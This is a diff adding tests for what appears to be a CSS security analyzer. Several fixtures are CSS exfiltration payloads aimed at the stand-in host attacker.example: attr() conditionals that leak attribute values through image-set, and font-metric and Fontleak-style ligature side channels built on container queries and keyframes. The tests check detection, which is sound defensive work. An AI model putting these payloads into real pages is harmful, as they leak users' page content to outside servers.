@@ -142,4 +142,45 @@ describe("core analyzer", () => {
     expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
   });
 
+  it("detects declaration-level inline attr() plus if(style()) CSS exfiltration", () => {
+    const summary = analyze('div{--user:attr(data-user);background:image-set(if(style(--user:"admin"): "https://attacker.example/admin.png"; else: "https://attacker.example/user.png") 1x)}');
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.value.attr_source"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.value.conditional_if"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.value.style_query"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("sink.image_set_remote"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
+  });
+
+  it("does not treat inline attr() conditionals without a remote sink as actionable", () => {
+    const summary = analyze('div{--count:attr(data-count);color:if(style(--count:"5"):green;else:gray)}');
+    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
+  });
+
+  it("detects remote font plus container/keyframe URL side-channel shapes", () => {
+    const containerSummary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.secret{font-family:"Leak";width:fit-content}@container (min-width:1px){.x{background:url(https://attacker.example/container)}}');
+    expect(containerSummary.findings.some((finding) => finding.reasons.includes("sink.font_metric_side_channel"))).toBe(true);
+    expect(containerSummary.findings.some((finding) => finding.reasons.includes("css.container_query"))).toBe(true);
+    expect(containerSummary.findings.some((finding) => finding.reasons.includes("css.font_measurement_setup"))).toBe(true);
+    const keyframeSummary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.secret{font-family:"Leak";animation:k 1s}@keyframes k{50%{background:url(https://attacker.example/key)}}');
+    expect(keyframeSummary.findings.some((finding) => finding.reasons.includes("css.keyframes_remote_sink"))).toBe(true);
+    expect(keyframeSummary.findings.some((finding) => finding.reasons.includes("css.font_animation_chain"))).toBe(true);
+  });
+
+  it("detects static Fontleak-style generated-content ligature measurement", () => {
+    const summary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.leak{font-family:"Leak";font-feature-settings:"liga" 1;width:fit-content;white-space:pre}.leak::before{font-family:"Leak";content:"\\100"}@container (width:11px){head::before{content:url(https://attacker.example/glyph)}}');
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.font_generated_content_probe"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.font_ligature_feature"))).toBe(true);
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.container_size_query"))).toBe(true);
+  });
+
+  it("does not treat disabled font-feature ligature values as active Fontleak ligature evidence", () => {
+    const summary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.leak{font-family:"Leak";font-feature-settings:"liga" 0;width:fit-content}.leak::before{font-family:"Leak";content:"\\100"}@container (width:11px){head::before{content:url(https://attacker.example/glyph)}}');
+    expect(summary.findings.some((finding) => finding.reasons.includes("css.font_ligature_feature"))).toBe(false);
+  });
+
+  it("does not treat ordinary remote webfonts in component container queries as Fontleak", () => {
+    const summary = analyze('@font-face{font-family:"Ui";src:url(https://fonts.gstatic.com/ui.woff2)}.card{font-family:"Ui";container-type:inline-size}@container (min-width:30rem){.card{background:url(https://cdn.example.test/card.svg)}}');
+    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
+  });
+
 });
